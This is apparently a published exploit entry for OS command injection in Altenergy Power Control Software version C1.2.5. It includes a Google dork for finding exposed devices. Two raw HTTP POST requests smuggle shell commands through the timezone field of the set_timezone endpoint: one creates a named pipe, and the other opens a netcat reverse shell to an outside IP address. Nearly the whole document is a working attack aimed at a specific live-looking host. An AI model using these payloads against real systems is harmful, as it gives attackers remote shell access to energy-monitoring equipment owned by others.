## title : OS command injection affects "Altenergy Power Control Software"
### SW ver : C1.2.5
### Vendor :  https://apsystems.com/
### Google Dork : intitle:"Altenergy Power Control Software"


## Exploit : 


HTTP request : 
```
POST /index.php/management/set_timezone HTTP/1.1
Host: 78.218.230.32:8081
Content-Length: 33
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://78.218.230.32:8081
Referer: http://78.218.230.32:8081/index.php/management/datetime
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

timezone=`mknod /tmp/backpipe p `
```
HTTP request : 

```
POST /index.php/management/set_timezone HTTP/1.1
Host: 78.218.230.32:8081
Content-Length: 73
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://78.218.230.32:8081
Referer: http://78.218.230.32:8081/index.php/management/datetime
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

timezone=`/bin/sh 0</tmp/backpipe | nc 156.197.154.12 4444 1>/tmp/backpipe`

```
POC : 
![Alt Text](poc.png)
